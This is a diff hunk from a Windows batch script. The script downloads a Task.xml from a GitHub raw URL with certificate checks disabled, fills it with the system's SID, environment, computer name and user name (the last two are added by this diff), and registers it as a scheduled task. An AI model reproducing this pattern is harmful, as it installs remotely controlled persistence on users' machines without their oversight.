@@ -13,6 +13,8 @@ schtasks /Delete /TN "%SID%XYZ" /F
 curl -k %proxy% "https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/Task.xml" > "%SID%.xml"
 powershell -Command "(gc '%SID%.xml') -replace 'SID', '%SID%' | Out-File -encoding ASCII '%SID%.xml'"
 powershell -Command "(gc '%SID%.xml') -replace 'environment', '%environment%' | Out-File -encoding ASCII '%SID%.xml'"
+powershell -Command "(gc '%SID%.xml') -replace 'computername', '%computername%' | Out-File -encoding ASCII '%SID%.xml'"
+powershell -Command "(gc '%SID%.xml') -replace 'username', '%username%' | Out-File -encoding ASCII '%SID%.xml'"
 schtasks /create /tn "%SID%XYZ" /xml "%SID%.xml"
 del "%SID%.xml"
 
